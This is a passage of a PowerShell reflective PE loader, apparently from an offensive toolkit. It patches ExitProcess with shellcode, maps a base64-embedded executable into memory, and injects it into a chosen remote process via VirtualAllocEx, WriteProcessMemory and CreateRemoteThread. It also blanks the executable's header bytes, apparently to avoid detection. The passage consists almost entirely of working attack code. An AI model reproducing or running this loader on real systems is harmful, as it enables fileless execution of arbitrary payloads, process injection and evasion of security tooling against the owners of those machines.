				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        if (((Get-WmiObject -Class Win32_Processor).AddressWidth / 8) -ne [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
        {
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
